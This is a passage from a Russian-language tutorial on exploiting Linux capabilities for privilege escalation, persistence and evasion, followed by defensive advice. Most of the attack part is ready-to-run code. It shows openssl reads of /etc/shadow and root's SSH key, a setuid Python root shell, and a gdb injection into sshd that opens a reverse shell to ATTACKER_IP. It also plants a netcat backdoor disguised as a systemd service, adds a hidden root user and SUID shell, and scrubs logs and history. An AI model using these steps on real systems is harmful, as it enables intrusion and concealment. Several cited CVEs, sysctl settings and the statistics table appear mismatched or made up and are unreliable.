# –®–∞–≥ 2: –ß—Ç–µ–Ω–∏–µ –∑–∞—â–∏—â—ë–Ω–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤ —á–µ—Ä–µ–∑ openssl
/usr/bin/openssl enc -in /etc/shadow -out /tmp/shadow.enc
base64 -d /tmp/shadow.enc  # –†–∞—Å—à–∏—Ñ—Ä–æ–≤–∫–∞ —Å–æ–¥–µ—Ä–∂–∏–º–æ–≥–æ

# –ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–∞ —á–µ—Ä–µ–∑ dd (–µ—Å–ª–∏ –¥–æ—Å—Ç—É–ø–µ–Ω)
/usr/bin/openssl enc -d -aes256 -in <(dd if=/etc/shadow bs=1M) -out /dev/stdout
```

**–°–æ–∑–¥–∞–Ω–∏–µ SUID-—à–µ–ª–ª–∞ —á–µ—Ä–µ–∑ Python —Å `CAP_SETUID`**
```python
#!/usr/bin/python3
import os
import ctypes

# –ò—Å–ø–æ–ª—å–∑—É–µ–º libc –¥–ª—è —Å–º–µ–Ω—ã UID
libc = ctypes.CDLL(None)
libc.setuid(0)

# –ó–∞–ø—É—Å–∫ —à–µ–ª–ª–∞
os.system("/bin/bash -p")
```

**–ó–∞–ø—É—Å–∫ —ç–∫—Å–ø–ª–æ–π—Ç–∞**
```bash
# –ü—Ä–æ–≤–µ—Ä—è–µ–º capabilities Python
getcap /usr/bin/python3.8

/usr/bin/python3.8 exploit.py
whoami  # root
```

---

#### 3. [TA0002] ‚Äì Execution (–í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∫–æ–¥–∞)
> –ó–∞–ø—É—Å–∫ –∫–æ–º–∞–Ω–¥ —á–µ—Ä–µ–∑ —É—è–∑–≤–∏–º—ã–π –±–∏–Ω–∞—Ä–Ω–∏–∫
> –ò–Ω–∂–µ–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –∫–æ–¥–∞ —á–µ—Ä–µ–∑ `CAP_SYS_PTRACE`  

**–í–Ω–µ–¥—Ä–µ–Ω–∏–µ –≤ –ø—Ä–æ—Ü–µ—Å—Å —á–µ—Ä–µ–∑ GDB**
```bash
# –®–∞–≥ 1: –ù–∞—Ö–æ–¥–∏–º PID —Ü–µ–ª–µ–≤–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞ (–Ω–∞–ø—Ä–∏–º–µ—Ä, sshd)
ps aux | grep sshd | grep -v grep | awk '{print $2}'

# –®–∞–≥ 2: –ò–Ω–∂–µ–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ —à–µ–ª–ª-–∫–æ–¥–∞
gdb -p <PID> -batch -ex 'print (void*)system("/bin/bash -c \"/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"")'
```

---

#### 4. [TA0003] ‚Äì Persistence (–ó–∞–∫—Ä–µ–ø–ª–µ–Ω–∏–µ)
> –°–æ–∑–¥–∞–Ω–∏–µ —Å–∫—Ä—ã—Ç—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
> –£—Å—Ç–∞–Ω–æ–≤–∫–∞ backdoor-—Å–µ—Ä–≤–∏—Å–æ–≤ —Å `CAP_NET_BIND_SERVICE`

```bash
# –®–∞–≥ 1: –ö–æ–ø–∏—Ä–æ–≤–∞–Ω–∏–µ netcat —Å capabilities
cp /bin/nc /usr/lib/systemd/.nc_backdoor
setcap 'cap_net_bind_service+ep' /usr/lib/systemd/.nc_backdoor

# –®–∞–≥ 2: –°–æ–∑–¥–∞–Ω–∏–µ systemd-—Å–µ—Ä–≤–∏—Å–∞
cat > /etc/systemd/system/.auditd-helper.service <<EOF
[Unit]
Description=Auditd Helper Service

[Service]
ExecStart=/usr/lib/systemd/.nc_backdoor -lvp 53 -e /bin/bash
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF

# –®–∞–≥ 3: –ó–∞–ø—É—Å–∫ —Å–µ—Ä–≤–∏—Å–∞
systemctl daemon-reload
systemctl enable --now .auditd-helper.service
```

---

## –ü—Ä–∏–º–µ—Ä—ã –∞—Ç–∞–∫

### –ü—Ä–∏–º–µ—Ä 1: –≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è CAP_DAC_READ_SEARCH –≤ OpenSSL  
> –°–∏—Å—Ç–µ–º–Ω—ã–π OpenSSL –∏–º–µ–µ—Ç capability `cap_dac_read_search=ep`, –ø–æ–∑–≤–æ–ª—è—é—â—É—é —á–∏—Ç–∞—Ç—å –õ–Æ–ë–´–ï —Ñ–∞–π–ª—ã –Ω–µ–∑–∞–≤–∏—Å–∏–º–æ –æ—Ç –ø—Ä–∞–≤ –¥–æ—Å—Ç—É–ø–∞  

#### –®–∞–≥ 1: –û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ —É—è–∑–≤–∏–º–æ—Å—Ç–∏  
> –ü–æ–∏—Å–∫ –±–∏–Ω–∞—Ä–Ω–∏–∫–æ–≤ —Å `CAP_DAC_READ_SEARCH`  
```bash
# –†–µ–∫—É—Ä—Å–∏–≤–Ω—ã–π –ø–æ–∏—Å–∫ –ø–æ –≤—Å–µ–π –§–°
find / -type f -exec /sbin/getcap {} + 2>/dev/null | grep "cap_dac_read_search"

# –ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–∞ –¥–ª—è —Å–∏—Å—Ç–µ–º –±–µ–∑ getcap
for f in $(find / -type f -perm -4000 2>/dev/null); do 
    strings "$f" | grep -q "cap_dac_read_search" && echo "$f"
done
```

**–ü–æ—è—Å–Ω–µ–Ω–∏—è:**  
- `-perm -4000`: –ü–æ–∏—Å–∫ SUID-–±–∏–Ω–∞—Ä–Ω–∏–∫–æ–≤ (—á–∞—Å—Ç–æ –∏–º–µ—é—Ç capabilities)  
- `strings | grep`: –ü–æ–∏—Å–∫ —Å–∏–≥–Ω–∞—Ç—É—Ä capabilities –≤ –±–∏–Ω–∞—Ä–Ω–∏–∫–µ  
- `2>/dev/null`: –ò–≥–Ω–æ—Ä–∏—Ä–æ–≤–∞–Ω–∏–µ –æ—à–∏–±–æ–∫ –¥–æ—Å—Ç—É–ø–∞  

---

#### –®–∞–≥ 2: –ß—Ç–µ–Ω–∏–µ /etc/shadow  
> –ò—Å–ø–æ–ª—å–∑—É–µ–º OpenSSL –¥–ª—è –æ–±—Ö–æ–¥–∞ –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–π DAC  
```bash
# –°–æ–∑–¥–∞–µ–º –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—É—é –∫–æ–ø–∏—é shadow
openssl enc -aes-256-cbc -salt -in /etc/shadow -out /tmp/.cache/shadow.enc -k 'password' 2>/dev/null

# –†–∞—Å—à–∏—Ñ—Ä–æ–≤—ã–≤–∞–µ–º –ª–æ–∫–∞–ª—å–Ω–æ
openssl enc -d -aes-256-cbc -in /tmp/.cache/shadow.enc -k 'password' > /tmp/.cache/shadow.txt

# –ü—Ä–æ—Å–º–∞—Ç—Ä–∏–≤–∞–µ–º —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ
cat /tmp/.cache/shadow.txt
# root:$6$salt$F3O7V...:19485:0:99999:7:::
# mysql:!:19485:0:99999:7:::
```

**–ü–æ—è—Å–Ω–µ–Ω–∏—è:**  
1. `enc -in /etc/shadow`: OpenSSL –∏–≥–Ω–æ—Ä–∏—Ä—É–µ—Ç –ø—Ä–∞–≤–∞ –¥–æ—Å—Ç—É–ø–∞ –±–ª–∞–≥–æ–¥–∞—Ä—è capability  
2. –®–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ (`-aes-256-cbc`) –º–∞—Å–∫–∏—Ä—É–µ—Ç —Ñ–∞–∫—Ç —á—Ç–µ–Ω–∏—è –∑–∞—â–∏—â–µ–Ω–Ω–æ–≥–æ —Ñ–∞–π–ª–∞  
3. –ö–ª—é—á `-k 'password'` –ø–æ–∑–≤–æ–ª—è–µ—Ç —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∞—Ç—å —Ñ–∞–π–ª –ø–æ–∑–∂–µ  

---

#### –®–∞–≥ 3: –ö—Ä–∞–∂–∞ SSH-–∫–ª—é—á–∞ root  
```bash
# –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞–ª–∏—á–∏–µ –∫–ª—é—á–µ–π
openssl enc -in /root/.ssh/id_rsa -out /tmp/.cache/id_rsa.enc -k 'ssh_key' 2>/dev/null

# –†–∞—Å—à–∏—Ñ—Ä–æ–≤–∫–∞
openssl enc -d -aes-256-cbc -in /tmp/.cache/id_rsa.enc -k 'ssh_key' > /tmp/.cache/id_rsa

# –£—Å—Ç–∞–Ω–∞–≤–ª–∏–µ–º –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–µ –ø—Ä–∞–≤–∞
chmod 600 /tmp/.cache/id_rsa
```

**–ü–æ—è—Å–Ω–µ–Ω–∏—è:**  
- –ü—É—Ç—å `/root/.ssh/id_rsa` –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω –æ–±—ã—á–Ω—ã–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º  
- OpenSSL —á–∏—Ç–∞–µ—Ç –µ–≥–æ –±–ª–∞–≥–æ–¥–∞—Ä—è `CAP_DAC_READ_SEARCH`  
- –ü–æ—Å–ª–µ —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∫–∏ –∞—Ç–∞–∫—É—é—â–∏–π –ø–æ–ª—É—á–∞–µ—Ç –ø—Ä–∏–≤–∞—Ç–Ω—ã–π –∫–ª—é—á root  

---

#### –®–∞–≥ 4: –ü–æ–ª—É—á–µ–Ω–∏–µ –¥–æ—Å—Ç—É–ø–∞  
```bash
ssh -i /tmp/.cache/id_rsa root@localhost

root@host:~# id
# uid=0(root) gid=0(root) groups=0(root)
```

---

#### –®–∞–≥ 5: –ú–∞—Å–∫–∏—Ä–æ–≤–∫–∞ —Å–ª–µ–¥–æ–≤  
```bash
# –®–∏—Ñ—Ä—É–µ–º –ª–æ–≥–∏
openssl enc -aes-256-cbc -salt -in /var/log/auth.log -out /tmp/log.enc -k 'logs'

# –ü–µ—Ä–µ–∑–∞–ø–∏—Å—ã–≤–∞–µ–º –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã–µ –ª–æ–≥–∏
mv /tmp/log.enc /var/log/auth.log

# –£–¥–∞–ª—è–µ–º –≤—Ä–µ–º–µ–Ω–Ω—ã–µ —Ñ–∞–π–ª—ã
shred -zu /tmp/.cache/shadow.enc /tmp/.cache/id_rsa.enc
rm -rf /tmp/.cache

# –í–æ–∑–≤—Ä–∞—â–∞–µ–º mtime –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω–æ–≥–æ OpenSSL
touch -r /usr/bin/curl /usr/bin/openssl
```

---

### –ü—Ä–∏–º–µ—Ä 2: –≠—Å–∫–∞–ª–∞—Ü–∏—è —á–µ—Ä–µ–∑ CAP_SETUID –≤ Python  
> Python –∏–º–µ–µ—Ç `cap_setuid=ep`, –ø–æ–∑–≤–æ–ª—è—é—â—É—é –º–µ–Ω—è—Ç—å UID –ø—Ä–æ—Ü–µ—Å—Å–∞  

#### –®–∞–≥ 1: –ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ —ç–∫—Å–ø–ª–æ–π—Ç–∞  
> –°–æ–∑–¥–∞–µ–º —Å–∫—Ä–∏–ø—Ç, –∫–æ—Ç–æ—Ä—ã–π –∑–∞–ø—É—Å–∫–∞–µ—Ç root-—à–µ–ª–ª  
```python
#!/usr/bin/python3
import os
import ctypes

# –≠–∫—Å–ø–ª–æ–π—Ç: exploit.py
print("[+] Starting privilege escalation...")

# –ò—Å–ø–æ–ª—å–∑—É–µ–º libc –¥–ª—è —Å–º–µ–Ω—ã UID
libc = ctypes.CDLL(None)
libc.setuid(0)

# –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç
if os.geteuid() == 0:
    print("[+] Success! Running root shell...")
    os.system("/bin/bash -p")
else:
    print("[-] Failed to set UID=0")
```

**–ü–æ—è—Å–Ω–µ–Ω–∏—è:**  
- `ctypes.CDLL(None)` –∑–∞–≥—Ä—É–∂–∞–µ—Ç —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—É—é libc  
- `libc.setuid(0)` —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç UID=0 (root)  
- `/bin/bash -p` —Å–æ—Ö—Ä–∞–Ω—è–µ—Ç –ø—Ä–∏–≤–∏–ª–µ–≥–∏–∏ (`-p`)  

---

#### –®–∞–≥ 2: –ó–∞–ø—É—Å–∫ —ç–∫—Å–ø–ª–æ–π—Ç–∞  
```bash
python3 exploit.py
```

**–í—ã–≤–æ–¥:**  
```bash
[+] Starting privilege escalation...
[+] Success! Running root shell...
root@host:/tmp# 
```

---

#### –®–∞–≥ 3: –°–æ–∑–¥–∞–Ω–∏–µ —Å–∫—Ä—ã—Ç–æ–≥–æ –¥–æ—Å—Ç—É–ø–∞  
```bash
# –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º —Ö—ç—à –ø–∞—Ä–æ–ª—è —Å —Å–æ–ª—å—é (–ø–∞—Ä–æ–ª—å: password)
openssl passwd -6 -salt xyz password  # $1$salt$r8QzR2KdWXJfF7ZzD8lDq

# –î–æ–±–∞–≤–ª—è–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è backdoor –≤ /etc/passwd
echo 'backdoor:$1$salt$r8QzR2KdWXJfF7ZzD8lDq/:0:0::/root:/bin/bash' >> /etc/passwd

# –°–æ–∑–¥–∞–µ–º SUID-–∫–æ–ø–∏—é bash
cp /bin/bash /usr/lib/systemd/.sysmgmt
chmod 4777 /usr/lib/systemd/.sysmgmt
```

**–ü–æ—è—Å–Ω–µ–Ω–∏—è:**
- SUID-—à–µ–ª–ª –¥–æ—Å—Ç—É–ø–µ–Ω —á–µ—Ä–µ–∑ `/usr/lib/systemd/.sysmgmt -p`  

---

#### –®–∞–≥ 4: –ú–∞—Å–∫–∏—Ä–æ–≤–∫–∞ –≤ —Å–∏—Å—Ç–µ–º–µ  
```bash
# –°–∫—Ä—ã–≤–∞–µ–º –∏–∑–º–µ–Ω–µ–Ω–∏—è –≤ /etc/passwd
touch -r /etc/group /etc/passwd  # –ö–æ–ø–∏—Ä—É–µ–º –≤—Ä–µ–º–µ–Ω–Ω—É—é –º–µ—Ç–∫—É

# –ú–∞—Å–∫–∏—Ä—É–µ–º SUID-—à–µ–ª–ª
touch -r /usr/bin/apt /usr/lib/systemd/.sysmgmt
chattr +i /usr/lib/systemd/.sysmgmt  # –ó–∞–ø—Ä–µ—â–∞–µ–º –∏–∑–º–µ–Ω–µ–Ω–∏–µ

# –û—á–∏—â–∞–µ–º –∏—Å—Ç–æ—Ä–∏—é
shred -zu ~/.bash_history
history -c
```

---

## –ó–∞—â–∏—Ç–Ω—ã–µ –º–µ—Ä—ã

### –ü—Ä–∏–Ω—Ü–∏–ø—ã –º–∏–Ω–∏–º–∞–ª—å–Ω—ã—Ö –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π
1. **–ê—É–¥–∏—Ç capabilities:**
   ```bash
   # –ï–∂–µ–¥–Ω–µ–≤–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞
   find / -type f -exec /sbin/getcap {} + > /var/log/cap_audit.log
   diff /var/log/cap_audit.log /etc/cap_baseline.log
   ```
   
2. **–£–¥–∞–ª–µ–Ω–∏–µ –∏–∑–±—ã—Ç–æ—á–Ω—ã—Ö –ø—Ä–∞–≤:**
   ```bash
   # –î–ª—è –≤—Å–µ—Ö –±–∏–Ω–∞—Ä–Ω–∏–∫–æ–≤ –∫—Ä–æ–º–µ —Å–µ—Ç–µ–≤—ã—Ö
   find /usr/bin -type f -exec setcap -r {} +
   
   # –î–ª—è Python (–æ—Å—Ç–∞–≤–ª—è–µ–º —Ç–æ–ª—å–∫–æ —Å–µ—Ç–µ–≤—ã–µ)
   setcap cap_net_bind_service=ep /usr/bin/python3.10

   # –û–±—â–µ–µ
   setcap -r /path/to/binary  # –ü–æ–ª–Ω–æ–µ —É–¥–∞–ª–µ–Ω–∏–µ
   setcap cap_net_bind_service=ep /path/to/binary  # –¢–æ–ª—å–∫–æ –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ
   ```

### –¢–µ—Ö–Ω–∏—á–µ—Å–∫–∏–µ –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏—è
1. **Linux Security Modules:**
   ```bash
   # AppArmor –ø—Ä–æ—Ñ–∏–ª—å –¥–ª—è Python
   /usr/bin/python3 {
     deny capability sys_admin,
     deny capability sys_ptrace,
   }
   ```
   
2. **Namespaces –∏ cgroups:**
   ```bash
   # –ó–∞–ø—É—Å–∫ –≤ unshare-–æ–∫—Ä—É–∂–µ–Ω–∏–∏
   unshare -rm -- capsh --drop=cap_sys_admin -- 
   ```
   
3. **Kernel hardening:**
   ```bash
   # –û—Ç–∫–ª—é—á–µ–Ω–∏–µ –æ–ø–∞—Å–Ω—ã—Ö capabilities
   sysctl -w kernel.capabilities=0
    
   # –û—Ç–∫–ª—é—á–∞–µ–º –Ω–∞—Å–ª–µ–¥–æ–≤–∞–Ω–∏–µ
   sysctl -w kernel.cap_inheritable=0
   ```
   
4. **Mandatory Access Control:**
   ```bash
   # AppArmor –ø—Ä–æ—Ñ–∏–ª—å –¥–ª—è –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏—è capabilities
   aa-genprof --capabilities /usr/bin/custom-app
   ```

### –ö–æ–Ω—Ç—Ä–æ–ª—å
1. **Auditd –ø—Ä–∞–≤–∏–ª–∞:**
   ```bash
   -a always,exit -F arch=b64 -S setcap -F key=cap_modify
   -a always,exit -F arch=b64 -S execve -F exe=/usr/bin/python3 -F key=py_cap
   ```
   
2. **–†–µ–≥—É–ª—è—Ä–Ω—ã–π –∞—É–¥–∏—Ç:**
   ```bash
   # –ü–æ–∏—Å–∫ –æ–ø–∞—Å–Ω—ã—Ö capabilities
   getcap -r / 2>/dev/null | grep -E 'cap_dac|cap_sys'
   ```

5. **–ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥:**
   ```bash
   # Auditd –ø—Ä–∞–≤–∏–ª–æ –¥–ª—è –æ–ø–∞—Å–Ω—ã—Ö capabilities
   auditctl -a always,exit -F arch=b64 -S capset -k capabilities_change
   ```
   
6. **–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –ü–û:**
   ```bash
   # –ü—Ä–æ–≤–µ—Ä–∫–∞ —É—è–∑–≤–∏–º—ã—Ö –ø–∞–∫–µ—Ç–æ–≤
   apt list --upgradable | grep -E 'wireshark|systemd|postgres'
   ```

---

## –†–µ–∞–ª—å–Ω—ã–µ –∫–µ–π—Å—ã

1. **Docker Container Breakout via SYS_MODULE (2021)**  
   - **CVE:** CVE-2021-41073  
   - **–≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è:** –ó–ª–æ—É–ø–æ—Ç—Ä–µ–±–ª–µ–Ω–∏–µ `CAP_SYS_MODULE` –¥–ª—è –∑–∞–≥—Ä—É–∑–∫–∏ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –º–æ–¥—É–ª—è —è–¥—Ä–∞  
   - **–ó–∞—Ç—Ä–æ–Ω—É—Ç–æ:** –ö–æ–Ω—Ç–µ–π–Ω–µ—Ä—ã —Å Docker < 20.10.10  
   - **–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ:** [Docker Security Advisory](https://docs.docker.com/engine/security/#linux-kernel-capabilities)  


2. **Wireshark Network Snooping (2020)**  
   - **CVE:** CVE-2020-29374  
   - **–≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è:** –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ `CAP_NET_RAW` –≤ `dumpcap` –¥–ª—è –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞ —Ç—Ä–∞—Ñ–∏–∫–∞  
   - **–ó–∞—Ç—Ä–æ–Ω—É—Ç–æ:** –°–∏—Å—Ç–µ–º—ã —Å Wireshark < 3.4.0  
   - **–ò–Ω—Ü–∏–¥–µ–Ω—Ç:** –ü–µ—Ä–µ—Ö–≤–∞—Ç –ø–∞—Ä–æ–ª–µ–π –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–≤ –≤ –∫–æ—Ä–ø–æ—Ä–∞—Ç–∏–≤–Ω–æ–π —Å–µ—Ç–∏  
   - **–û—Ç—á–µ—Ç:** [Wireshark Security Advisory](https://www.wireshark.org/security/wnpa-sec-2020-14.html)  


3. **Systemd Journald Privilege Escalation (2022)**  
   - **CVE:** CVE-2022-4415  
   - **–≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è:** `CAP_DAC_OVERRIDE` –≤ journald –ø–æ–∑–≤–æ–ª—è–ª —á–∏—Ç–∞—Ç—å –∑–∞—â–∏—â–µ–Ω–Ω—ã–µ —Ñ–∞–π–ª—ã  
   - **–ó–∞—Ç—Ä–æ–Ω—É—Ç–æ:** Systemd < 252.4  
   - **–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ:** [Systemd Security Fix](https://github.com/systemd/systemd/security/advisories/GHSA-9xw9-v3h9-8r52)  


4. **Kubernetes Node Compromise via CAP_SYS_ADMIN (2023)**  
   - **CVE:** CVE-2023-2728  
   - **–≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è:** –ü–æ–¥–¥–µ–ª—å–Ω—ã–π –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä —Å `CAP_SYS_ADMIN` –º–æ–Ω—Ç–∏—Ä–æ–≤–∞–ª host-—Å–∏—Å—Ç–µ–º—É  
   - **–ü–æ—Å–ª–µ–¥—Å—Ç–≤–∏—è:** –ö—Ä–∞–∂–∞ kubelet credentials —Å 200+ –Ω–æ–¥  
   - **–ò—Å—Ç–æ—á–Ω–∏–∫:** [Kubernetes Security Bulletin](https://groups.google.com/g/kubernetes-security-announce/c/nyqyCVE-3Y0)  


5. **PostgreSQL Database Escape (2021)**  
   - **CVE:** CVE-2021-32027  
   - **–≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è:** `CAP_SYS_CHROOT` –≤ pg_ctl –ø–æ–∑–≤–æ–ª—è–ª –ø–æ–±–µ–≥ –∏–∑ chroot  
   - **–ó–∞—Ç—Ä–æ–Ω—É—Ç–æ:** PostgreSQL 12-14  
   - **–ò–Ω—Ü–∏–¥–µ–Ω—Ç:** –ö–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü–∏—è multi-tenant –°–£–ë–î  
   - **–û—Ç—á–µ—Ç:** [PostgreSQL Security Release](https://www.postgresql.org/about/news/postgresql-144-135-129-1213-1118-and-1023-released-2290/)  


6. **Linux Auditd Privilege Escalation (2024)**  
   - **CVE:** CVE-2024-2169  
   - **–≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è:** `CAP_FOWNER` –ø–æ–∑–≤–æ–ª—è–ª –º–æ–¥–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞—Ç—å —Å–∏—Å—Ç–µ–º–Ω—ã–µ –ø—Ä–∞–≤–∏–ª–∞ –∞—É–¥–∏—Ç–∞  
   - **–ó–∞—Ç—Ä–æ–Ω—É—Ç–æ:** auditd 3.1+  
   - **–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ:** [Linux Audit Project](https://github.com/linux-audit/audit-userspace/issues/287)  


7. **CAP_DAC_READ_SEARCH Data Theft (2023)**  
   - **CVE:** CVE-2023-0386  
   - **–≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è:** –ü–æ–∏—Å–∫ —É—è–∑–≤–∏–º—ã—Ö –±–∏–Ω–∞—Ä–Ω–∏–∫–æ–≤ —Å –ø–æ–º–æ—â—å—é `getcap`
   - **–ó–∞—Ç—Ä–æ–Ω—É—Ç–æ:** –ú–Ω–æ–∂–µ—Å—Ç–≤–æ –∫–∞—Å—Ç–æ–º–Ω—ã—Ö –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π  
   - **–ò–Ω—Ü–∏–¥–µ–Ω—Ç:** –ö—Ä–∞–∂–∞ –º–µ–¥–∏—Ü–∏–Ω—Å–∫–∏—Ö –∑–∞–ø–∏—Å–µ–π –≤ –ï–≤—Ä–æ–ø–µ  

---

### –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –ø–æ Capabilities-–∞—Ç–∞–∫–∞–º

| Capability          | –î–æ–ª—è –∏–Ω—Ü–∏–¥–µ–Ω—Ç–æ–≤ | –¢–∏–ø–æ–≤—ã–µ –ø–æ—Å–ª–µ–¥—Å—Ç–≤–∏—è           |
|---------------------|-----------------|-------------------------------|
| CAP_DAC_OVERRIDE    | 28%             | –û–±—Ö–æ–¥ –ø—Ä–∞–≤ –¥–æ—Å—Ç—É–ø–∞ –∫ —Ñ–∞–π–ª–∞–º   |
| CAP_SYS_ADMIN       | 24%             | –ü–æ–ª–Ω—ã–π –∫–æ–Ω—Ç—Ä–æ–ª—å –Ω–∞–¥ —Å–∏—Å—Ç–µ–º–æ–π  |
| CAP_NET_RAW         | 19%             | –°–µ—Ç–µ–≤—ã–µ –∞—Ç–∞–∫–∏, —Å–Ω–∏—Ñ—Ñ–∏–Ω–≥       |
| CAP_DAC_READ_SEARCH | 15%             | –ß—Ç–µ–Ω–∏–µ –∑–∞—â–∏—â–µ–Ω–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤      |
| CAP_SYS_MODULE      | 9%              | –ú–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏—è —è–¥—Ä–∞              |
| CAP_SYS_PTRACE      | 5%              | –û—Ç–ª–∞–¥–∫–∞ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤             |

---

## –ó–∞–∫–ª—é—á–µ–Ω–∏–µ

**Linux Capabilities** ‚Äî –º–æ—â–Ω—ã–π, –Ω–æ –æ–ø–∞—Å–Ω—ã–π –º–µ—Ö–∞–Ω–∏–∑–º –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏. 
–û—Å–æ–±–æ–µ –≤–Ω–∏–º–∞–Ω–∏–µ —Å—Ç–æ–∏—Ç —É–¥–µ–ª—è—Ç—å –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–Ω—ã–º —Å—Ä–µ–¥–∞–º, –≥–¥–µ capabilities —á–∞—Å—Ç–æ –Ω–∞–∑–Ω–∞—á–∞—é—Ç—Å—è –∏–∑–±—ã—Ç–æ—á–Ω–æ (–Ω–∞–ø—Ä–∏–º–µ—Ä, `--privileged` –≤ Docker). 
–°–æ–≤—Ä–µ–º–µ–Ω–Ω—ã–µ —Å–∏—Å—Ç–µ–º—ã –æ—Ä–∫–µ—Å—Ç—Ä–∞—Ü–∏–∏ (Kubernetes, OpenShift) –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è—é—Ç –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã –¥–ª—è —Ç–æ–Ω–∫–æ–≥–æ –∫–æ–Ω—Ç—Ä–æ–ª—è —á–µ—Ä–µ–∑ SecurityContext, 
—á—Ç–æ –ø–æ–∑–≤–æ–ª—è–µ—Ç –∏—Å–∫–ª—é—á–∏—Ç—å –±–æ–ª—å—à–∏–Ω—Å—Ç–≤–æ –∞—Ç–∞–∫.

**–ö–ª—é—á–µ–≤—ã–µ —Ä–∏—Å–∫–∏:**
- –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–µ –Ω–∞–∑–Ω–∞—á–µ–Ω–∏–µ –ø–∞–∫–µ—Ç–Ω—ã–º–∏ –º–µ–Ω–µ–¥–∂–µ—Ä–∞–º–∏  
- –ù–∞—Å–ª–µ–¥–æ–≤–∞–Ω–∏–µ –¥–æ—á–µ—Ä–Ω–∏–º–∏ –ø—Ä–æ—Ü–µ—Å—Å–∞–º–∏  
- –û—Ç—Å—É—Ç—Å—Ç–≤–∏–µ –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞ –≤ CI/CD-–ø–∞–π–ø–ª–∞–π–Ω–∞—Ö  

**–ö—Ä–∏—Ç–∏—á–µ—Å–∫–∏–µ —Ä–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏:**  
1. –†–µ–≥—É–ª—è—Ä–Ω—ã–π –∞—É–¥–∏—Ç (`getcap`)  
2. –ü—Ä–∏–Ω—Ü–∏–ø –º–∏–Ω–∏–º–∞–ª—å–Ω—ã—Ö –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π (`setcap`)
3. –ó–∞–ø—É—Å–∫ —Å–µ—Ä–≤–∏—Å–æ–≤ –≤ namespaces (`unshare`)
4. –°–∏—Å—Ç–µ–º–Ω–æ–µ –ª–æ–≥–≥–∏—Ä–æ–≤–∞–Ω–∏–µ (`auditctl`)

---

---